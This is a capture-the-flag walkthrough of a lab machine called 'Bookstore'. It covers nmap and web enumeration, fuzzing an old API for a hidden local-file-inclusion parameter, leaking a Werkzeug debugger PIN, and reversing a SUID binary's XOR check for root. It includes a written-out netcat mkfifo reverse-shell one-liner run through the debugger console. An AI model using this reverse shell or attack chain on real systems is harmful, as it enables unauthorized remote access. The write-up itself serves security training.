## Bookstore

# Enumeration
```
# Nmap 7.91 scan initiated Thu May 20 14:15:40 2021 as: nmap -sCV -oN nmap/initial -vvv -p 22,80,5000 10.10.160.176
Nmap scan report for 10.10.160.176
Host is up, received reset ttl 61 (0.15s latency).
Scanned at 2021-05-20 14:15:41 PDT for 12s

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 44:0e:60:ab:1e:86:5b:44:28:51:db:3f:9b:12:21:77 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCs5RybjdxaxapwkXwbzqZqONeX4X8rYtfTsy7wey7ZeRNsl36qQWhTrurBWWnYPO7wn2nEQ7Iz0+tmvSI3hms3eIEufCC/2FEftezKhtP1s4/qjp8UmRdaewMW2zYg+UDmn9QYmRfbBH80CLQvBwlsibEi3aLvhi/YrNCzL5yxMFQNWHIEMIry/FK1aSbMj7DEXTRnk5R3CYg3/OX1k3ssy7GlXAcvt5QyfmQQKfwpOG7UM9M8mXDCMiTGlvgx6dJkbG0XI81ho2yMlcDEZ/AsXaDPAKbH+RW5FsC5R1ft9PhRnaIkUoPwCLKl8Tp6YFSPcANVFYwTxtdUReU3QaF9
|   256 59:2f:70:76:9f:65:ab:dc:0c:7d:c1:a2:a3:4d:e6:40 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCbhAKUo1OeBOX5j9stuJkgBBmhTJ+zWZIRZyNDaSCxG6U817W85c9TV1oWw/A0TosCyr73Mn73BiyGAxis6lNQ=
|   256 10:9f:0b:dd:d6:4d:c7:7a:3d:ff:52:42:1d:29:6e:ba (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAr3xDLg8D5BpJSRh8OgBRPhvxNSPERedYUTJkjDs/jc
80/tcp   open  http    syn-ack ttl 61 Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 834559878C5590337027E6EB7D966AEE
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Book Store
5000/tcp open  http    syn-ack ttl 61 Werkzeug httpd 0.14.1 (Python 3.6.9)
| http-methods:
|_  Supported Methods: HEAD OPTIONS GET
| http-robots.txt: 1 disallowed entry
|_/api </p>
|_http-server-header: Werkzeug/0.14.1 Python/3.6.9
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu May 20 14:15:53 2021 -- 1 IP address (1 host up) scanned in 13.27 seconds
```

SSH, http server, and after looking up Werkzeug a python web application library with a disallowed robots.txt entry for api so maybe we will find something to abuse here if we have access. Firstly though lets see if we get some background info from the http server so we do some manual exploration and some enumeration to find the following on the http server
```
/images               (Status: 301) [Size: 315] [--> http://10.10.160.176/images/]
/index.html           (Status: 200) [Size: 6452]
/login.html           (Status: 200) [Size: 5325]
/books.html           (Status: 200) [Size: 2940]
/assets               (Status: 301) [Size: 315] [--> http://10.10.160.176/assets/]
/javascript           (Status: 301) [Size: 319] [--> http://10.10.160.176/javascript/]
/LICENSE.txt          (Status: 200) [Size: 17130]
```

In the html comments for books.html we can find base32 string which is just there to lead us on. However, in the html comments for the /login.html we find the following note of interest
```
<!--Still Working on this page will add the backend support soon, also the debugger pin is inside sid's bash history file -->
```

After looking it up we can verify that the werkzeug debugger console is in fact located at /console on port 5000 and a pin is needed, however now we know that we need to access sid's .bash_history file in order to find that pin. Before we finally head over to /api we do a check of /assets for any api related files and find a api.js file with the following comment
```
//the previous version of the api had a paramter which lead to local file inclusion vulnerability, glad we now have the new version which is secure.

```

So looks like a previous version had a vulnerable LFI parameter we'll keep this along with everything else we have learned in mind as we checkout /api on port 5000.

# API Endpoint
```
API Documentation
Since every good API has a documentation we have one as well!
The various routes this API currently provides are:

/api/v2/resources/books/all (Retrieve all books and get the output in a json format)

/api/v2/resources/books/random4 (Retrieve 4 random records)

/api/v2/resources/books?id=1(Search by a specific parameter , id parameter)

/api/v2/resources/books?author=J.K. Rowling (Search by a specific parameter, this query will return all the books with author=J.K. Rowling)

/api/v2/resources/books?published=1993 (This query will return all the books published in the year 1993)

/api/v2/resources/books?author=J.K. Rowling&published=2003 (Search by a combination of 2 or more parameters)
```

So we are using v2 according to the documentation but we know the previous version was vulnerable lets see if it's still accessible by checking /api/v1/resources/books/all. We get a json output so it seems like the previous version of the api is still accessible. We go ahead and try the above parameters for LFI but are unsuccessful so lets go ahead and fuzz to see if there are any hidden parameters as follows
```
# wfuzz -u http://10.10.160.176:5000/api/v1/resources/books?FUZZ=.bash_history -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.160.176:5000/api/v1/resources/books?FUZZ=.bash_history
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000395:   200        7 L      11 W       116 Ch      "REDACTED"
000000486:   200        1 L      1 W        3 Ch        "author"
000000529:   200        1 L      1 W        3 Ch        "id"
```

We pretty quickly find the parameter and we don't even have to do any directory traversal to get a result on the .bash_history file we are trying to find so we go check the response we got and in fact find the debug pin so lets go access that /console. Sure enough the pin works and we have a console to execute ptyhong commands so lets use python to send us a shell as follows
```
>>> import os
>>> os.system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f')
```

Sure enough we get a reverse shell on our listener and have an initial foothold.

# Initial Foothold
```
sid@bookstore:~$ ls -la
total 80
drwxr-xr-x 5 sid  sid   4096 Oct 20  2020 .
drwxr-xr-x 3 root root  4096 Oct 20  2020 ..
-r--r--r-- 1 sid  sid   4635 Oct 20  2020 api.py
-r-xr-xr-x 1 sid  sid    160 Oct 14  2020 api-up.sh
-r--r----- 1 sid  sid    116 May 21 04:08 .bash_history
-rw-r--r-- 1 sid  sid    220 Oct 20  2020 .bash_logout
-rw-r--r-- 1 sid  sid   3771 Oct 20  2020 .bashrc
-rw-rw-r-- 1 sid  sid  16384 Oct 19  2020 books.db
drwx------ 2 sid  sid   4096 Oct 20  2020 .cache
drwx------ 3 sid  sid   4096 Oct 20  2020 .gnupg
drwxrwxr-x 3 sid  sid   4096 Oct 20  2020 .local
-rw-r--r-- 1 sid  sid    807 Oct 20  2020 .profile
-rwsrwsr-x 1 root sid   8488 Oct 20  2020 try-harder
-r--r----- 1 sid  sid     33 Oct 15  2020 user.txt
```

We find the user.txt flag as well as a binary try-harder owned by root with an SUID bit set so looks like have a possible method of privilege escalation. Running the binary asks us for a magic number so lets go ahead and send the binary to our local machine to analyze in ghidra. We find the following main function
```
void main(void)

{
  long in_FS_OFFSET;
  uint local_1c;
  uint local_18;
  uint local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setuid(0);
  local_18 = 0x5db3;
  puts("What\'s The Magic Number?!");
  __isoc99_scanf(&DAT_001008ee,&local_1c);
  local_14 = local_1c ^ 0x1116 ^ local_18;
  if (local_14 == 0x5dcd21f4) {
    system("/bin/bash -p");
  }
  else {
    puts("Incorrect Try Harder");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

Looking at this tell us that our input is stored in local_1c and then xor'd with 0x1116 and then local_18 which we can see from above has a value 0x5db3. Then it is stored in local_14 and compared with 0x5dcd21f4 to spawn a shell with privileges. So with the root SUID bit set this means it should just spawn us a root shell and all we need to to do is reverse the xor operations and figure out our magic number. We convert our result to decimal and input it when we run the binary on the system and sure enough we are spawned a root shell and can find the root flag at /root/root.txt.